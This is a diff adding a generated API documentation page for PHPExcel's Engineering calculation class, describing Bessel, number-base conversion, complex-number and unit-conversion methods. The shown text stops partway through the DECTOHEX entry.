@@ -1,0 +1,1563 @@
+<!--[ANNIE83E333BF08546819]-->
+<!DOCTYPE html><html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;">
+<meta charset="utf-8">
+<title>PHPExcel classes » \PHPExcel_Calculation_Engineering</title>
+<meta name="author" content="Mike van Riel">
+<meta name="description" content="">
+<link href="../css/template.css" rel="stylesheet" media="all">
+<script src="../js/jquery-1.7.1.min.js" type="text/javascript"></script><script src="../js/jquery-ui-1.8.2.custom.min.js" type="text/javascript"></script><script src="../js/jquery.mousewheel.min.js" type="text/javascript"></script><script src="../js/bootstrap.js" type="text/javascript"></script><script src="../js/template.js" type="text/javascript"></script><script src="../js/prettify/prettify.min.js" type="text/javascript"></script><link rel="shortcut icon" href="../img/favicon.ico">
+<link rel="apple-touch-icon" href="../img/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="72x72" href="../img/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="114x114" href="../img/apple-touch-icon-114x114.png">
+</head>
+<body>
+<div class="navbar navbar-fixed-top">
+<div class="navbar-inner"><div class="container">
+<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></a><a class="brand" href="../index.html">PHPExcel classes</a><div class="nav-collapse"><ul class="nav">
+<li class="dropdown">
+<a href="#api" class="dropdown-toggle" data-toggle="dropdown">
+                                    API Documentation <b class="caret"></b></a><ul class="dropdown-menu">
+<li><a>Packages</a></li>
+<li><a href="../packages/Default.html"><i class="icon-folder-open"></i> Default</a></li>
+<li><a href="../packages/JAMA.html"><i class="icon-folder-open"></i> JAMA</a></li>
+<li><a href="../packages/JAMA%0D%0ACholesky%20decomposition%20class%0D%0AFor%20a%20symmetric,%20positive%20definite%20matrix%20A,%20the%20Cholesky%20decomposition%0D%0Ais%20an%20lower%20triangular%20matrix%20L%20so%20that%20A%20=%20L*L'.html"><i class="icon-folder-open"></i> JAMA
+Cholesky decomposition class
+For a symmetric, positive definite matrix A, the Cholesky decomposition
+is an lower triangular matrix L so that A = L*L'</a></li>
+<li><a href="../packages/JAMA%0D%0AClass%20to%20obtain%20eigenvalues%20and%20eigenvectors%20of%20a%20real%20matrix.html"><i class="icon-folder-open"></i> JAMA
+Class to obtain eigenvalues and eigenvectors of a real matrix</a></li>
+<li><a href="../packages/JAMA%0D%0AError%20handling.html"><i class="icon-folder-open"></i> JAMA
+Error handling</a></li>
+<li><a href="../packages/JAMA%0D%0AFor%20an%20m-by-n%20matrix%20A%20with%20m%20&gt;=%20n,%20the%20LU%20decomposition%20is%20an%20m-by-n%0D%0Aunit%20lower%20triangular%20matrix%20L,%20an%20n-by-n%20upper%20triangular%20matrix%20U,%0D%0Aand%20a%20permutation%20vector%20piv%20of%20length%20m%20so%20that%20A(piv,:)%20=%20L*U.html"><i class="icon-folder-open"></i> JAMA
+For an m-by-n matrix A with m &gt;= n, the LU decomposition is an m-by-n
+unit lower triangular matrix L, an n-by-n upper triangular matrix U,
+and a permutation vector piv of length m so that A(piv,:) = L*U</a></li>
+<li><a href="../packages/JAMA%0D%0AFor%20an%20m-by-n%20matrix%20A%20with%20m%20&gt;=%20n,%20the%20QR%20decomposition%20is%20an%20m-by-n%0D%0Aorthogonal%20matrix%20Q%20and%20an%20n-by-n%20upper%20triangular%20matrix%20R%20so%20that%0D%0AA%20=%20Q*R.html"><i class="icon-folder-open"></i> JAMA
+For an m-by-n matrix A with m &gt;= n, the QR decomposition is an m-by-n
+orthogonal matrix Q and an n-by-n upper triangular matrix R so that
+A = Q*R</a></li>
+<li><a href="../packages/JAMA%0D%0AFor%20an%20m-by-n%20matrix%20A%20with%20m%20&gt;=%20n,%20the%20singular%20value%20decomposition%20is%0D%0Aan%20m-by-n%20orthogonal%20matrix%20U,%20an%20n-by-n%20diagonal%20matrix%20S,%20and%0D%0Aan%20n-by-n%20orthogonal%20matrix%20V%20so%20that%20A%20=%20U*S*V'.html"><i class="icon-folder-open"></i> JAMA
+For an m-by-n matrix A with m &gt;= n, the singular value decomposition is
+an m-by-n orthogonal matrix U, an n-by-n diagonal matrix S, and
+an n-by-n orthogonal matrix V so that A = U*S*V'</a></li>
+<li><a href="../packages/JAMA%0D%0APythagorean%20Theorem:%0D%0Aa%20=%203%0D%0Ab%20=%204%0D%0Ar%20=%20sqrt(square(a)%20+%20square(b))%0D%0Ar%20=%205%0D%0Ar%20=%20sqrt(a%5E2%20+%20b%5E2)%20without%20under.overflow.html"><i class="icon-folder-open"></i> JAMA
+Pythagorean Theorem:
+a = 3
+b = 4
+r = sqrt(square(a) + square(b))
+r = 5
+r = sqrt(a^2 + b^2) without under/overflow</a></li>
+<li><a href="../packages/PHPExcel.html"><i class="icon-folder-open"></i> PHPExcel</a></li>
+</ul>
+</li>
+<li class="dropdown" id="charts-menu">
+<a href="#charts" class="dropdown-toggle" data-toggle="dropdown">
+                                    Charts <b class="caret"></b></a><ul class="dropdown-menu"><li><a href="../graph_class.html"><i class="icon-list-alt"></i> Class hierarchy diagram</a></li></ul>
+</li>
+<li class="dropdown" id="reports-menu">
+<a href="#reports" class="dropdown-toggle" data-toggle="dropdown">
+                                    Reports <b class="caret"></b></a><ul class="dropdown-menu">
+<li><a href="../errors.html"><i class="icon-remove-sign"></i> Errors 
+                <span class="label label-info">519</span></a></li>
+<li><a href="../markers.html"><i class="icon-map-marker"></i> Markers 
+                <ul>
+<li>todo 
+                <span class="label label-info">19</span>
+</li>
+<li>fixme 
+                <span class="label label-info">10</span>
+</li>
+</ul></a></li>
+<li><a href="../deprecated.html"><i class="icon-stop"></i> Deprecated elements 
+                <span class="label label-info">12</span></a></li>
+</ul>
+</li>
+</ul></div>
+</div></div>
+<div class="go_to_top"><a href="#___" style="color: inherit">Back to top  <i class="icon-upload icon-white"></i></a></div>
+</div>
+<div id="___" class="container">
+<noscript><div class="alert alert-warning">
+                            Javascript is disabled; several features are only available
+                            if Javascript is enabled.
+                        </div></noscript>
+<div class="row">
+<div class="span4">
+<span class="btn-group visibility" data-toggle="buttons-checkbox"><button class="btn public active" title="Show public elements">Public</button><button class="btn protected" title="Show protected elements">Protected</button><button class="btn private" title="Show private elements">Private</button><button class="btn inherited active" title="Show inherited elements">Inherited</button></span><div class="btn-group view pull-right" data-toggle="buttons-radio">
+<button class="btn details" title="Show descriptions and method names"><i class="icon-list"></i></button><button class="btn simple" title="Show only method names"><i class="icon-align-justify"></i></button>
+</div>
+<ul class="side-nav nav nav-list">
+<li class="nav-header">
+<i class="icon-custom icon-method"></i> Methods
+                    <ul>
+<li class="method public "><a href="#method_BESSELI" title="BESSELI :: BESSELI"><span class="description">BESSELI</span><pre>BESSELI()</pre></a></li>
+<li class="method public "><a href="#method_BESSELJ" title="BESSELJ :: BESSELJ"><span class="description">BESSELJ</span><pre>BESSELJ()</pre></a></li>
+<li class="method public "><a href="#method_BESSELK" title="BESSELK :: BESSELK"><span class="description">BESSELK</span><pre>BESSELK()</pre></a></li>
+<li class="method public "><a href="#method_BESSELY" title="BESSELY :: BESSELY"><span class="description">BESSELY</span><pre>BESSELY()</pre></a></li>
+<li class="method public "><a href="#method_BINTODEC" title="BINTODEC :: BINTODEC"><span class="description">BINTODEC</span><pre>BINTODEC()</pre></a></li>
+<li class="method public "><a href="#method_BINTOHEX" title="BINTOHEX :: BINTOHEX"><span class="description">BINTOHEX</span><pre>BINTOHEX()</pre></a></li>
+<li class="method public "><a href="#method_BINTOOCT" title="BINTOOCT :: BINTOOCT"><span class="description">BINTOOCT</span><pre>BINTOOCT()</pre></a></li>
+<li class="method public "><a href="#method_COMPLEX" title="COMPLEX :: COMPLEX"><span class="description">COMPLEX</span><pre>COMPLEX()</pre></a></li>
+<li class="method public "><a href="#method_CONVERTUOM" title="CONVERTUOM :: CONVERTUOM"><span class="description">CONVERTUOM</span><pre>CONVERTUOM()</pre></a></li>
+<li class="method public "><a href="#method_DECTOBIN" title="DECTOBIN :: DECTOBIN"><span class="description">DECTOBIN</span><pre>DECTOBIN()</pre></a></li>
+<li class="method public "><a href="#method_DECTOHEX" title="DECTOHEX :: DECTOHEX"><span class="description">DECTOHEX</span><pre>DECTOHEX()</pre></a></li>
+<li class="method public "><a href="#method_DECTOOCT" title="DECTOOCT :: DECTOOCT"><span class="description">DECTOOCT</span><pre>DECTOOCT()</pre></a></li>
+<li class="method public "><a href="#method_DELTA" title="DELTA :: DELTA"><span class="description">DELTA</span><pre>DELTA()</pre></a></li>
+<li class="method public "><a href="#method_ERF" title="ERF :: ERF"><span class="description">ERF</span><pre>ERF()</pre></a></li>
+<li class="method public "><a href="#method_ERFC" title="ERFC :: ERFC"><span class="description">ERFC</span><pre>ERFC()</pre></a></li>
+<li class="method public "><a href="#method_GESTEP" title="GESTEP :: GESTEP"><span class="description">GESTEP</span><pre>GESTEP()</pre></a></li>
+<li class="method public "><a href="#method_HEXTOBIN" title="HEXTOBIN :: HEXTOBIN"><span class="description">HEXTOBIN</span><pre>HEXTOBIN()</pre></a></li>
+<li class="method public "><a href="#method_HEXTODEC" title="HEXTODEC :: HEXTODEC"><span class="description">HEXTODEC</span><pre>HEXTODEC()</pre></a></li>
+<li class="method public "><a href="#method_HEXTOOCT" title="HEXTOOCT :: HEXTOOCT"><span class="description">HEXTOOCT</span><pre>HEXTOOCT()</pre></a></li>
+<li class="method public "><a href="#method_IMABS" title="IMABS :: IMABS"><span class="description">IMABS</span><pre>IMABS()</pre></a></li>
+<li class="method public "><a href="#method_IMAGINARY" title="IMAGINARY :: IMAGINARY"><span class="description">IMAGINARY</span><pre>IMAGINARY()</pre></a></li>
+<li class="method public "><a href="#method_IMARGUMENT" title="IMARGUMENT :: IMARGUMENT"><span class="description">IMARGUMENT</span><pre>IMARGUMENT()</pre></a></li>
+<li class="method public "><a href="#method_IMCONJUGATE" title="IMCONJUGATE :: IMCONJUGATE"><span class="description">IMCONJUGATE</span><pre>IMCONJUGATE()</pre></a></li>
+<li class="method public "><a href="#method_IMCOS" title="IMCOS :: IMCOS"><span class="description">IMCOS</span><pre>IMCOS()</pre></a></li>
+<li class="method public "><a href="#method_IMDIV" title="IMDIV :: IMDIV"><span class="description">IMDIV</span><pre>IMDIV()</pre></a></li>
+<li class="method public "><a href="#method_IMEXP" title="IMEXP :: IMEXP"><span class="description">IMEXP</span><pre>IMEXP()</pre></a></li>
+<li class="method public "><a href="#method_IMLN" title="IMLN :: IMLN"><span class="description">IMLN</span><pre>IMLN()</pre></a></li>
+<li class="method public "><a href="#method_IMLOG10" title="IMLOG10 :: IMLOG10"><span class="description">IMLOG10</span><pre>IMLOG10()</pre></a></li>
+<li class="method public "><a href="#method_IMLOG2" title="IMLOG2 :: IMLOG2"><span class="description">IMLOG2</span><pre>IMLOG2()</pre></a></li>
+<li class="method public "><a href="#method_IMPOWER" title="IMPOWER :: IMPOWER"><span class="description">IMPOWER</span><pre>IMPOWER()</pre></a></li>
+<li class="method public "><a href="#method_IMPRODUCT" title="IMPRODUCT :: IMPRODUCT"><span class="description">IMPRODUCT</span><pre>IMPRODUCT()</pre></a></li>
+<li class="method public "><a href="#method_IMREAL" title="IMREAL :: IMREAL"><span class="description">IMREAL</span><pre>IMREAL()</pre></a></li>
+<li class="method public "><a href="#method_IMSIN" title="IMSIN :: IMSIN"><span class="description">IMSIN</span><pre>IMSIN()</pre></a></li>
+<li class="method public "><a href="#method_IMSQRT" title="IMSQRT :: IMSQRT"><span class="description">IMSQRT</span><pre>IMSQRT()</pre></a></li>
+<li class="method public "><a href="#method_IMSUB" title="IMSUB :: IMSUB"><span class="description">IMSUB</span><pre>IMSUB()</pre></a></li>
+<li class="method public "><a href="#method_IMSUM" title="IMSUM :: IMSUM"><span class="description">IMSUM</span><pre>IMSUM()</pre></a></li>
+<li class="method public "><a href="#method_OCTTOBIN" title="OCTTOBIN :: OCTTOBIN"><span class="description">OCTTOBIN</span><pre>OCTTOBIN()</pre></a></li>
+<li class="method public "><a href="#method_OCTTODEC" title="OCTTODEC :: OCTTODEC"><span class="description">OCTTODEC</span><pre>OCTTODEC()</pre></a></li>
+<li class="method public "><a href="#method_OCTTOHEX" title="OCTTOHEX :: OCTTOHEX"><span class="description">OCTTOHEX</span><pre>OCTTOHEX()</pre></a></li>
+<li class="method public "><a href="#method__erfVal" title="_erfVal :: "><span class="description">_erfVal()
+        </span><pre>_erfVal()</pre></a></li>
+<li class="method public "><a href="#method__parseComplex" title="_parseComplex :: _parseComplex"><span class="description">_parseComplex</span><pre>_parseComplex()</pre></a></li>
+<li class="method public "><a href="#method_getConversionGroupUnitDetails" title="getConversionGroupUnitDetails :: getConversionGroupUnitDetails"><span class="description">getConversionGroupUnitDetails</span><pre>getConversionGroupUnitDetails()</pre></a></li>
+<li class="method public "><a href="#method_getConversionGroupUnits" title="getConversionGroupUnits :: getConversionGroupUnits
+Returns an array of units of measure, for a specified conversion group, or for all groups"><span class="description">getConversionGroupUnits
+Returns an array of units of measure, for a specified conversion group, or for all groups</span><pre>getConversionGroupUnits()</pre></a></li>
+<li class="method public "><a href="#method_getConversionGroups" title="getConversionGroups :: getConversionGroups
+Returns a list of the different conversion groups for UOM conversions"><span class="description">getConversionGroups
+Returns a list of the different conversion groups for UOM conversions</span><pre>getConversionGroups()</pre></a></li>
+<li class="method public "><a href="#method_getConversionMultipliers" title="getConversionMultipliers :: getConversionMultipliers
+Returns an array of the Multiplier prefixes that can be used with Units of Measure in CONVERTUOM()"><span class="description">getConversionMultipliers
+Returns an array of the Multiplier prefixes that can be used with Units of Measure in CONVERTUOM()</span><pre>getConversionMultipliers()</pre></a></li>
+</ul>
+</li>
+<li class="nav-header private">» Private
+                    <ul>
+<li class="method private "><a href="#method__Besselk0" title="_Besselk0 :: "><span class="description">_Besselk0()
+        </span><pre>_Besselk0()</pre></a></li>
+<li class="method private "><a href="#method__Besselk1" title="_Besselk1 :: "><span class="description">_Besselk1()
+        </span><pre>_Besselk1()</pre></a></li>
+<li class="method private "><a href="#method__Bessely0" title="_Bessely0 :: "><span class="description">_Bessely0()
+        </span><pre>_Bessely0()</pre></a></li>
+<li class="method private "><a href="#method__Bessely1" title="_Bessely1 :: "><span class="description">_Bessely1()
+        </span><pre>_Bessely1()</pre></a></li>
+<li class="method private "><a href="#method__cleanComplex" title="_cleanComplex :: Cleans the leading characters in a complex number string"><span class="description">Cleans the leading characters in a complex number string</span><pre>_cleanComplex()</pre></a></li>
+<li class="method private "><a href="#method__erfcVal" title="_erfcVal :: "><span class="description">_erfcVal()
+        </span><pre>_erfcVal()</pre></a></li>
+<li class="method private "><a href="#method__nbrConversionFormat" title="_nbrConversionFormat :: Formats a number base string value with leading zeroes"><span class="description">Formats a number base string value with leading zeroes</span><pre>_nbrConversionFormat()</pre></a></li>
+</ul>
+</li>
+<li class="nav-header">
+<i class="icon-custom icon-property"></i> Properties
+                    <ul></ul>
+</li>
+<li class="nav-header private">» Private
+                    <ul>
+<li class="property private "><a href="#property__conversionMultipliers" title="$_conversionMultipliers :: Details of the Multiplier prefixes that can be used with Units of Measure in CONVERTUOM()"><span class="description"></span><pre>$_conversionMultipliers</pre></a></li>
+<li class="property private "><a href="#property__conversionUnits" title="$_conversionUnits :: Details of the Units of measure that can be used in CONVERTUOM()"><span class="description"></span><pre>$_conversionUnits</pre></a></li>
+<li class="property private "><a href="#property__one_sqrtpi" title="$_one_sqrtpi :: "><span class="description"></span><pre>$_one_sqrtpi</pre></a></li>
+<li class="property private "><a href="#property__two_sqrtpi" title="$_two_sqrtpi :: "><span class="description"></span><pre>$_two_sqrtpi</pre></a></li>
+<li class="property private "><a href="#property__unitConversions" title="$_unitConversions :: Details of the Units of measure conversion factors, organised by group"><span class="description"></span><pre>$_unitConversions</pre></a></li>
+</ul>
+</li>
+</ul>
+</div>
+<div class="span8">
+<a id="\PHPExcel_Calculation_Engineering"></a><ul class="breadcrumb">
+<li>
+<a href="../index.html"><i class="icon-custom icon-class"></i></a><span class="divider">\</span>
+</li>
+<li><a href="../namespaces/global.html">global</a></li>
+<li class="active">
+<span class="divider">\</span><a href="../classes/PHPExcel_Calculation_Engineering.html">PHPExcel_Calculation_Engineering</a>
+</li>
+</ul>
+<div class="element class">
+<p class="short_description">PHPExcel_Calculation_Engineering</p>
+<div class="details">
+<div class="long_description"></div>
+<table class="table table-bordered">
+<tr>
+<th>category</th>
+<td>PHPExcel</td>
+</tr>
+<tr>
+<th>package</th>
+<td><a href="../packages/PHPExcel.Calculation.html">PHPExcel_Calculation</a></td>
+</tr>
+<tr>
+<th>copyright</th>
+<td>Copyright (c) 2006 - 2013 PHPExcel (http://www.codeplex.com/PHPExcel)</td>
+</tr>
+</table>
+<h3>
+<i class="icon-custom icon-method"></i> Methods</h3>
+<a id="method_BESSELI"></a><div class="element clickable method public method_BESSELI" data-toggle="collapse" data-target=".method_BESSELI .collapse">
+<h2>BESSELI</h2>
+<pre>BESSELI(float $x, integer $ord) : float</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the modified Bessel function In(x), which is equivalent to the Bessel function evaluated
+    for purely imaginary arguments</p>
+
+<p>Excel Function:
+    BESSELI(x,ord)</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>float</code><p>The value at which to evaluate the function.
+                            If x is nonnumeric, BESSELI returns the #VALUE! error value.</p>
+</div>
+<div class="subelement argument">
+<h4>$ord</h4>
+<code>integer</code><p>The order of the Bessel function.
+                            If ord is not an integer, it is truncated.
+                            If $ord is nonnumeric, BESSELI returns the #VALUE! error value.
+                            If $ord < 0, BESSELI returns the #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>float</code></div>
+</div></div>
+</div>
+<a id="method_BESSELJ"></a><div class="element clickable method public method_BESSELJ" data-toggle="collapse" data-target=".method_BESSELJ .collapse">
+<h2>BESSELJ</h2>
+<pre>BESSELJ(float $x, integer $ord) : float</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the Bessel function</p>
+
+<p>Excel Function:
+    BESSELJ(x,ord)</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>float</code><p>The value at which to evaluate the function.
+                            If x is nonnumeric, BESSELJ returns the #VALUE! error value.</p>
+</div>
+<div class="subelement argument">
+<h4>$ord</h4>
+<code>integer</code><p>The order of the Bessel function. If n is not an integer, it is truncated.
+                            If $ord is nonnumeric, BESSELJ returns the #VALUE! error value.
+                            If $ord < 0, BESSELJ returns the #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>float</code></div>
+</div></div>
+</div>
+<a id="method_BESSELK"></a><div class="element clickable method public method_BESSELK" data-toggle="collapse" data-target=".method_BESSELK .collapse">
+<h2>BESSELK</h2>
+<pre>BESSELK(float $x, integer $ord) : float</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the modified Bessel function Kn(x), which is equivalent to the Bessel functions evaluated
+    for purely imaginary arguments.</p>
+
+<p>Excel Function:
+    BESSELK(x,ord)</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>float</code><p>The value at which to evaluate the function.
+                            If x is nonnumeric, BESSELK returns the #VALUE! error value.</p>
+</div>
+<div class="subelement argument">
+<h4>$ord</h4>
+<code>integer</code><p>The order of the Bessel function. If n is not an integer, it is truncated.
+                            If $ord is nonnumeric, BESSELK returns the #VALUE! error value.
+                            If $ord < 0, BESSELK returns the #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>float</code></div>
+</div></div>
+</div>
+<a id="method_BESSELY"></a><div class="element clickable method public method_BESSELY" data-toggle="collapse" data-target=".method_BESSELY .collapse">
+<h2>BESSELY</h2>
+<pre>BESSELY(float $x, integer $ord) : float</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Returns the Bessel function, which is also called the Weber function or the Neumann function.</p>
+
+<p>Excel Function:
+    BESSELY(x,ord)</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>float</code><p>The value at which to evaluate the function.
+                            If x is nonnumeric, BESSELK returns the #VALUE! error value.</p>
+</div>
+<div class="subelement argument">
+<h4>$ord</h4>
+<code>integer</code><p>The order of the Bessel function. If n is not an integer, it is truncated.
+                            If $ord is nonnumeric, BESSELK returns the #VALUE! error value.
+                            If $ord < 0, BESSELK returns the #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>float</code></div>
+</div></div>
+</div>
+<a id="method_BINTODEC"></a><div class="element clickable method public method_BINTODEC" data-toggle="collapse" data-target=".method_BINTODEC .collapse">
+<h2>BINTODEC</h2>
+<pre>BINTODEC(string $x) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Return a binary value as decimal.</p>
+
+<p>Excel Function:
+    BIN2DEC(x)</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>string</code><p>The binary number (as a string) that you want to convert. The number
+                            cannot contain more than 10 characters (10 bits). The most significant
+                            bit of number is the sign bit. The remaining 9 bits are magnitude bits.
+                            Negative numbers are represented using two's-complement notation.
+                            If number is not a valid binary number, or if number contains more than
+                            10 characters (10 bits), BIN2DEC returns the #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_BINTOHEX"></a><div class="element clickable method public method_BINTOHEX" data-toggle="collapse" data-target=".method_BINTOHEX .collapse">
+<h2>BINTOHEX</h2>
+<pre>BINTOHEX(string $x, integer $places) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Return a binary value as hex.</p>
+
+<p>Excel Function:
+    BIN2HEX(x[,places])</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>string</code><p>The binary number (as a string) that you want to convert. The number
+                            cannot contain more than 10 characters (10 bits). The most significant
+                            bit of number is the sign bit. The remaining 9 bits are magnitude bits.
+                            Negative numbers are represented using two's-complement notation.
+                            If number is not a valid binary number, or if number contains more than
+                            10 characters (10 bits), BIN2HEX returns the #NUM! error value.</p>
+</div>
+<div class="subelement argument">
+<h4>$places</h4>
+<code>integer</code><p>The number of characters to use. If places is omitted, BIN2HEX uses the
+                            minimum number of characters necessary. Places is useful for padding the
+                            return value with leading 0s (zeros).
+                            If places is not an integer, it is truncated.
+                            If places is nonnumeric, BIN2HEX returns the #VALUE! error value.
+                            If places is negative, BIN2HEX returns the #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_BINTOOCT"></a><div class="element clickable method public method_BINTOOCT" data-toggle="collapse" data-target=".method_BINTOOCT .collapse">
+<h2>BINTOOCT</h2>
+<pre>BINTOOCT(string $x, integer $places) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Return a binary value as octal.</p>
+
+<p>Excel Function:
+    BIN2OCT(x[,places])</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>string</code><p>The binary number (as a string) that you want to convert. The number
+                            cannot contain more than 10 characters (10 bits). The most significant
+                            bit of number is the sign bit. The remaining 9 bits are magnitude bits.
+                            Negative numbers are represented using two's-complement notation.
+                            If number is not a valid binary number, or if number contains more than
+                            10 characters (10 bits), BIN2OCT returns the #NUM! error value.</p>
+</div>
+<div class="subelement argument">
+<h4>$places</h4>
+<code>integer</code><p>The number of characters to use. If places is omitted, BIN2OCT uses the
+                            minimum number of characters necessary. Places is useful for padding the
+                            return value with leading 0s (zeros).
+                            If places is not an integer, it is truncated.
+                            If places is nonnumeric, BIN2OCT returns the #VALUE! error value.
+                            If places is negative, BIN2OCT returns the #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_COMPLEX"></a><div class="element clickable method public method_COMPLEX" data-toggle="collapse" data-target=".method_COMPLEX .collapse">
+<h2>COMPLEX</h2>
+<pre>COMPLEX(float $realNumber, float $imaginary, string $suffix) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Converts real and imaginary coefficients into a complex number of the form x + yi or x + yj.</p>
+
+<p>Excel Function:
+    COMPLEX(realNumber,imaginary[,places])</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$realNumber</h4>
+<code>float</code><p>The real coefficient of the complex number.</p></div>
+<div class="subelement argument">
+<h4>$imaginary</h4>
+<code>float</code><p>The imaginary coefficient of the complex number.</p></div>
+<div class="subelement argument">
+<h4>$suffix</h4>
+<code>string</code><p>The suffix for the imaginary component of the complex number.
+                                    If omitted, the suffix is assumed to be "i".</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_CONVERTUOM"></a><div class="element clickable method public method_CONVERTUOM" data-toggle="collapse" data-target=".method_CONVERTUOM .collapse">
+<h2>CONVERTUOM</h2>
+<pre>CONVERTUOM(float $value, string $fromUOM, string $toUOM) : float</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Converts a number from one measurement system to another.
+For example, CONVERT can translate a table of distances in miles to a table of distances
+in kilometers.</p>
+
+<p>Excel Function:
+    CONVERT(value,fromUOM,toUOM)</p></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$value</h4>
+<code>float</code><p>The value in fromUOM to convert.</p></div>
+<div class="subelement argument">
+<h4>$fromUOM</h4>
+<code>string</code><p>The units for value.</p></div>
+<div class="subelement argument">
+<h4>$toUOM</h4>
+<code>string</code><p>The units for the result.</p></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>float</code></div>
+</div></div>
+</div>
+<a id="method_DECTOBIN"></a><div class="element clickable method public method_DECTOBIN" data-toggle="collapse" data-target=".method_DECTOBIN .collapse">
+<h2>DECTOBIN</h2>
+<pre>DECTOBIN(string $x, integer $places) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Return a decimal value as binary.</p>
+
+<p>Excel Function:
+    DEC2BIN(x[,places])</p></div>
+<table class="table table-bordered">
+<tr>
+<th>access</th>
+<td>public</td>
+</tr>
+<tr>
+<th>category</th>
+<td>Engineering Functions</td>
+</tr>
+</table>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$x</h4>
+<code>string</code><p>The decimal integer you want to convert. If number is negative,
+                            valid place values are ignored and DEC2BIN returns a 10-character
+                            (10-bit) binary number in which the most significant bit is the sign
+                            bit. The remaining 9 bits are magnitude bits. Negative numbers are
+                            represented using two's-complement notation.
+                            If number < -512 or if number > 511, DEC2BIN returns the #NUM! error
+                            value.
+                            If number is nonnumeric, DEC2BIN returns the #VALUE! error value.
+                            If DEC2BIN requires more than places characters, it returns the #NUM!
+                            error value.</p>
+</div>
+<div class="subelement argument">
+<h4>$places</h4>
+<code>integer</code><p>The number of characters to use. If places is omitted, DEC2BIN uses
+                            the minimum number of characters necessary. Places is useful for
+                            padding the return value with leading 0s (zeros).
+                            If places is not an integer, it is truncated.
+                            If places is nonnumeric, DEC2BIN returns the #VALUE! error value.
+                            If places is zero or negative, DEC2BIN returns the #NUM! error value.</p>
+</div>
+<h3>Returns</h3>
+<div class="subelement response"><code>string</code></div>
+</div></div>
+</div>
+<a id="method_DECTOHEX"></a><div class="element clickable method public method_DECTOHEX" data-toggle="collapse" data-target=".method_DECTOHEX .collapse">
+<h2>DECTOHEX</h2>
+<pre>DECTOHEX(string $x, integer $places) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"><p>Return a decimal value as hex.</p>
+
+<p>Excel Function:
+    DEC2HEX(x[,places])</p></div>
